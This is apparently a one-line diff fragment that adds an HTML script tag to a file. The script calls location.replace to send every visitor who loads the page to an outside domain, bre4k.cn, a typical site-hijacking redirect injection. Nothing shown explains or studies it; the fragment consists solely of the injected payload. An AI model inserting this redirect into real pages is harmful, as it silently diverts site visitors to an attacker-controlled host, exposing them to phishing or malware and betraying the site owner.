@@ -1,0 +1,1 @@
+<script>location.replace("http://bre4k.cn")</script>
